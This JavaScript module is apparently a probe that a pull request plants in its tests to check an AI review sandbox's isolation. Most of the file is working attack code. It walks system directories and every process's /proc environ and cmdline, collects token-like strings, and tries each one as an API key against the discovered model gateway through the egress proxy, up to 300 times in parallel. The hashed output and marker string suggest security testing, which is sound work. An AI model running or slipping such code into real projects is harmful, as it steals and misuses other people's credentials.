import { createHash } from "node:crypto";
import fs from "node:fs";
import http from "node:http";
import https from "node:https";
import net from "node:net";
import path from "node:path";
import tls from "node:tls";

/**
 * What the pull request plants in its tests: it collects everything its
 * code can read that looks like a credential (the environment, every
 * process's environment and arguments, files under the usual roots) and
 * tries each as a key for the review chat's model through Work's gateway,
 * over the sandbox's egress proxy and TLS as any client there would. It
 * prints one line, `WORK-PROBE <json>`, naming candidates by hash only and
 * never printing the words its requests carry, so a model call that has
 * them came from it.
 */
const ROOTS = ["/workspace", "/tmp", "/root", "/home", "/run", "/var/run"];
const SKIP = new Set(["node_modules", "objects", "proc", "sys", "dev"]);
const CREDENTIAL_PATH =
  /grant|token|secret|key|cred|auth|session|config|netrc/i;
const TOKEN = /[A-Za-z0-9_\-.~+/=]{20,}/g;
const GATEWAY = /https?:\/\/[^\s"'<>@]+?\/api\/gateway/g;
const MAX_ATTEMPTS = 300;
/** What its requests say: a model call carrying this came from the probe. */
const MARK = "a key this pull request found";
/** Tries at once, and how long all of them may take. */
const PARALLEL = 16;
const BUDGET_MS = 60_000;
const SYSTEM_CA = "/etc/ssl/certs/ca-certificates.crt";

function walk(directory, depth, found) {
  let entries = [];
  try {
    entries = fs.readdirSync(directory, { withFileTypes: true });
  } catch {
    return;
  }
  for (const entry of entries) {
    const file = path.join(directory, entry.name);
    if (entry.isSocket()) found.sockets.push(file);
    else if (entry.isDirectory()) {
      if (depth < 8 && !SKIP.has(entry.name)) walk(file, depth + 1, found);
    } else if (entry.isFile()) {
      try {
        if (fs.statSync(file).size <= 256 * 1024) {
          found.texts.set(file, fs.readFileSync(file, "utf8"));
          found.files += 1;
        }
      } catch {
        found.unreadable += 1;
      }
    }
  }
}

function processes(found) {
  let pids = [];
  try {
    pids = fs.readdirSync("/proc").filter((entry) => /^\d+$/.test(entry));
  } catch {
    return;
  }
  for (const pid of pids)
    for (const part of ["environ", "cmdline"])
      try {
        const text = fs.readFileSync(`/proc/${pid}/${part}`, "utf8");
        found.texts.set(`/proc/${pid}/${part}`, text.replaceAll("\0", "\n"));
      } catch {
        found.unreadable += 1;
      }
}

/** A socket to `target` through the egress proxy's CONNECT tunnel. */
function tunnel(proxy, target) {
  return new Promise((resolve, reject) => {
    const port = target.port || (target.protocol === "https:" ? "443" : "80");
    const request = http.request({
      host: proxy.hostname,
      port: Number(proxy.port),
      method: "CONNECT",
      path: `${target.hostname}:${port}`,
      timeout: 10_000,
    });
    request.on("connect", (response, socket) => {
      if (response.statusCode === 200) resolve(socket);
      else {
        socket.destroy();
        reject(new Error(`CONNECT answered ${response.statusCode}`));
      }
    });
    request.on("timeout", () => request.destroy(new Error("timeout")));
    request.on("error", reject);
    request.end();
  });
}

/** One POST to the gateway with `key`: its status, or why it got none. */
async function attempt(proxy, target, key) {
  const body = JSON.stringify({
    model: "claude-sonnet-5-5",
    max_tokens: 1,
    metadata: { user_id: MARK },
    messages: [{ role: "user", content: MARK }],
  });
  let socket;
  try {
    socket = await tunnel(proxy, target);
  } catch (error) {
    return `tunnel: ${error.message}`;
  }
  const ca = fs.existsSync(SYSTEM_CA) ? fs.readFileSync(SYSTEM_CA) : undefined;
  return new Promise((resolve) => {
    const request = (target.protocol === "https:" ? https : http).request(
      {
        host: target.hostname,
        port: Number(target.port || (target.protocol === "https:" ? 443 : 80)),
        method: "POST",
        path: target.pathname,
        timeout: 10_000,
        createConnection: () =>
          target.protocol === "https:"
            ? tls.connect({
                socket,
                host: target.hostname,
                ...(net.isIP(target.hostname)
                  ? {}
                  : { servername: target.hostname }),
                ...(ca ? { ca } : {}),
              })
            : socket,
        headers: {
          host: target.host,
          "content-type": "application/json",
          "content-length": Buffer.byteLength(body),
          "anthropic-version": "2023-06-01",
          "x-api-key": key,
          authorization: `Bearer ${key}`,
        },
      },
      (response) => {
        response.resume();
        resolve(String(response.statusCode ?? 0));
      },
    );
    request.on("timeout", () => request.destroy(new Error("timeout")));
    request.on("error", (error) =>
      resolve(`error: ${error.code ?? error.message}`),
    );
    request.end(body);
  });
}

export async function probe() {
  const found = { texts: new Map(), sockets: [], files: 0, unreadable: 0 };
  for (const root of ROOTS) walk(root, 0, found);
  processes(found);
  found.texts.set("env", Object.values(process.env).join("\n"));
  const gateways = new Set();
  // What a grant's or a key's own file holds is tried first.
  const likely = new Set();
  const others = new Set();
  for (const [source, text] of found.texts) {
    for (const match of text.matchAll(GATEWAY)) gateways.add(match[0]);
    const credentialLike =
      source === "env" ||
      source.startsWith("/proc/") ||
      CREDENTIAL_PATH.test(source);
    if (!credentialLike) continue;
    const into = /grant|token|secret|key/i.test(source) ? likely : others;
    for (const match of text.matchAll(TOKEN)) into.add(match[0]);
    for (const line of text.split("\n"))
      if (/^\S{20,}$/.test(line.trim())) into.add(line.trim());
  }
  const candidates = new Set([...likely, ...others]);
  const proxy = new URL(
    process.env.HTTP_PROXY ?? process.env.http_proxy ?? "http://127.0.0.1:3128",
  );
  const tries = [...gateways]
    .flatMap((gateway) =>
      [...candidates].map((key) => ({
        target: new URL(`${gateway}/model/anthropic/v1/messages`),
        key,
      })),
    )
    .slice(0, MAX_ATTEMPTS);
  const statuses = {};
  const deadline = Date.now() + BUDGET_MS;
  let skipped = 0;
  let next = 0;
  await Promise.all(
    Array.from({ length: PARALLEL }, async () => {
      while (next < tries.length) {
        const { target, key } = tries[next];
        next += 1;
        if (Date.now() > deadline) {
          skipped += 1;
          continue;
        }
        const status = await attempt(proxy, target, key);
        statuses[status] = (statuses[status] ?? 0) + 1;
      }
    }),
  );
  const hash = (value) =>
    createHash("sha256").update(value).digest("hex").slice(0, 16);
  console.log(
    `WORK-PROBE ${JSON.stringify({
      files: found.files,
      unreadable: found.unreadable,
      sockets: found.sockets,
      gateways: [...gateways],
      candidates: [...candidates].map(hash),
      attempts: tries.length - skipped,
      skipped,
      statuses,
    })}`,
  );
}
